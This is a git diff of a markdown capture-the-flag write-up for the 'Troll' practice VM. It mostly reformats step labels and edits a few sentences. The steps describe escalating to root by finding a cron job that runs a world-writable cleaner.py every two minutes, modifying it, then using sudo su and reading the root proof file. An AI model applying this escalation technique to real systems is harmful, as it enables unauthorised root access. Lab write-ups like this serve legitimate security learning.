@@ -201,7 +201,7 @@ overflow@troll:/$ cat var/log/cronlog
 ```
 This is cron job which run every 2 minutes. If I could modify cleaner.py and let python do something for me so I would be able to escalate overflow's privilege. But in the first place, I have to find cleaner.py.
 
-Find cleaner.py
+### Find cleaner.py
 ```
 overflow@troll:/$ find / -name cleaner.py | grep "cleaner.py"
 ...
@@ -210,7 +210,7 @@ overflow@troll:/$ find / -name cleaner.py | grep "cleaner.py"
 /lib/log/cleaner.py
 ```
 
-Let check for the python file
+### Let check for the python file
 ```
 overflow@troll:/$ cat /lib/log/cleaner.py
 #!/usr/bin/env python
@@ -224,7 +224,7 @@ overflow@troll:/$ ls -al /lib/log/cleaner.py
 ```
 Now good news, I found the python file and it's worldwritable.
 
-Modify cleaner.py
+### Modify cleaner.py
 ```
 overflow@troll:/$ cat /lib/log/cleaner.py
 #!/usr/bin/env python
@@ -235,8 +235,7 @@ try:
 except:
         sys.exit()
 ```
-Now wait for 2 minutes....
-
+Now wait for 2 minutes.... the machine kicked me out and I login again and could escalate to root.
 ```
 overflow@troll:/$ sudo su
 sudo: unable to resolve host troll
@@ -247,7 +246,7 @@ Now I got root!!!
 ## Finding the flag
 I just check for /root directory and found the proof file.
 ```
-root@troll:~# ls -al
+root@troll:~# ls -al root/
 total 28
 drwx------  3 root root 4096 Aug 13  2014 .
 drwxr-xr-x 21 root root 4096 Aug  9  2014 ..
